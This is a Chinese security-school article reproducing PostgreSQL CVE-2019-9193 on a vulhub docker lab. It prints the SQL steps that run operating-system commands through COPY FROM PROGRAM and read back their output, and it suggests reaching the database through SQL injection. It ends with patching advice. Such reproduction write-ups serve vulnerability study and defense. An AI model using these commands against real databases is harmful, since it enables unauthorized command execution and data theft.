> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/d_PlkDtioCsN1apeiGJh1Q)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6pRiabDicuyO5uBZsDB68SyC0XxgOZhLhlViaOZ1YCIFFeMJjrXWeooBlQ1e4FbKVVYYVGyuZZkicfBA/640?wx_fmt=gif)

本文由 “网络安全检测与防护技术国家地方联合工程研究中心深圳分中心——东塔网络安全学院” 总结归纳

**0x00 简介**

PostgreSQL(读作 Post-Gres-Q-L) 是一个功能非常强大的、源代码开放的客户 / 服务器关系型数据库管理系统（RDBMS）。采用类似 MIT 的许可协议，允许开发人员做任何事情，包括在开源或闭源产品中商用，其源代码是免费提供的。

PostgreSQL 特点：

Ø 支持 WINDOWS、Linux、Solaris、macOS 、BSD。

Ø 支持文本、图像、视频、声音等

Ø 支持 ACID、关联完整性、数据库事务、Unicode 多国语言。Ø 支持临时表，与物化视图

Ø 支持 SQL 的许多功能，例如复杂的 SQL 查询，子查询，外键，触发器，视图，视图，多进程并发控制 (MVCC)、异步复制。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQDicOTcCQMRJjuglpa5FrPA4dfQqcq7U1oiacv3vq1h2dMF6yAA9kVBCg/640?wx_fmt=png) 

**0x01 漏洞概述**

PostgreSQL 是一个功能强大对象关系数据库管理系统 (ORDBMS)。由于 9.3 增加一个“COPY TO/FROM PROGRAM” 功能。这个功能就是允许数据库的超级用户以及 pg_read_server_files 组中的任何用户执行操作系统命令。

**0x02 影响版本**

9.3-11.2

**0x03 环境搭建**

1. 本次漏洞环境使用 vulhub 中的 docker 搭建，vulhub 下载地址：

https://github.com/vulhub/vulhub

2. 下载完成后使用 xftp 传入安装有 docker 和环 docker-compose 境的虚拟机中解压并启动环境

```
cd vulhub-master/postgres/CVE-2019-9193
docker-compose up -d
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQNdxq7iaO04KPrywauia4ZDqStLPMUPnSLhMian2iax7V3a0VA0ziaKBWJew/640?wx_fmt=png)

3. 使用 docker ps 查看是否启动成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQHP2hqPHVianRegknqYRzQBiath1HibR9Ljsjwaibzr1icm4ldQnEGM4CBuA/640?wx_fmt=png) 

4. 启动成功后使用 navicat 连接数据库，数据库初始账号密码为 postgres/

postgres

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQRBYF9DiaEx7BgR8soSooicy78TD2L8emIgfsBrpelicqh9ibNlibDwwoUicg/640?wx_fmt=png) 

**0x04 漏洞复现**

注：这个漏洞介于权限提升和任意代码执行之间，它需要一些前提权限，这些权限可以是通过正常的登录 PostgreSQL 也可以是通过 SQL 注入获得与 PostgreSQL 交互的途径。需要说明的是，上述两种情形下都需要用户是一个超级用户或者是 “pg_read_server_files” 组用户

1. 执行删除你想用来保存命令输出但是可能存在的表，这一步可有可无

```
DROP TABLE IF EXISTS cmd_exec
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQ9V4cqQ5j0RgoDUXd4gHZG1zMsksO7jZEaVm1jkHBnyy9Pl4b8XJysg/640?wx_fmt=png) 

2. 创建用来保存命令输出的表

```
CREATE TABLE cmd_exec(cmd_output text);
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQcCVibibA90N6UGA2g2kSXiaxeqCmau0KaaotCZarabmiaVuNYYI6Vic6s3w/640?wx_fmt=png) 

3. 通过 “COPY FROM PROGRAM” 执行系统命令

```
COPY cmd_exec FROM PROGRAM 'id'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQffStbWhrWN6XqX9CVKDoeKLZHzLPTibhR2dO722JNtRbERUNicibBxzgw/640?wx_fmt=png) 

4. 将结果显示出来

```
SELECT * FROM cmd_exec
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQUNOEe5edTCUHJYs9MODbyKsbsSVGyxthhicAVbVlQUBV9dfYy0NgMEg/640?wx_fmt=png) 

5. 执行其他命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQfgyuy9nibTALRoWOxaub6uJAg9skBqRHL39vf8VicXE2szNjydXZKdAw/640?wx_fmt=png) 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQW86lZ6PkzSruQ5TtQt6kiaUX4tBR6ibXLo9BnBciczrNWIpGuDPyNQHAA/640?wx_fmt=png)

6. 查看账号信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQWqibU657FEtgjxWqibXAbwrm2puMLrYcT5sSxolDXd4VbcPJk73sibkmA/640?wx_fmt=png)

**0x05 修复建议**

1. 建议升级至最新版本

2. 控制数据库权限禁止普通用户执行命令

免责申明：   

本项目仅进行信息搜集，漏洞探测工作，无漏洞利用、攻击性行为，发文初衷为仅为方便安全人员对授权项目完成测试工作和学习交流使用。

请使用者遵守当地相关法律，勿用于非授权测试，勿用于非授权测试，勿用于非授权测试（重要的事情说三遍），如作他用所承受的法律责任一概与东塔网络安全学院无关！

东塔网络安全学院在各大平台均上线了各项活动和学习内容，快快登录以下各大平台学习起来吧~  

微博、腾讯课堂、知乎、今日头条、抖音：

东塔网络安全学院

哔哩哔哩：东塔网络安全

了解更多活动和咨询欢迎微信添加：dongtakefu

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQfciaw73HAJxqibzvAaja2qMCBstNsyWIVZ5tsKvAYhCBnOqBop6A0IVw/640?wx_fmt=jpeg)

- 免费获取学习资料

电子书籍、试听课程 -

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4GqO7WjR3dBDuWOMpmStoLaQKJiaVCBTwKicAKdptkbfMEOuhm85HEtgq8LLhCYlzibkpicP7THLpLkDQg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucChaE0GfBticZTQQq7TyhaiaeptZbqmENrZO6pazDwFpVB6aTFicgLwngsOuNLMY3sIMxddybn82O4Q8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucChaE0GfBticZTQQq7Tyhaiaepl2oEubhGdZoAicHvXAYeSiarPXAy9OXNtJiaCkvviccX0w0Z0t0ibBnnD2Q/640?wx_fmt=png)

点击蓝字

分享我们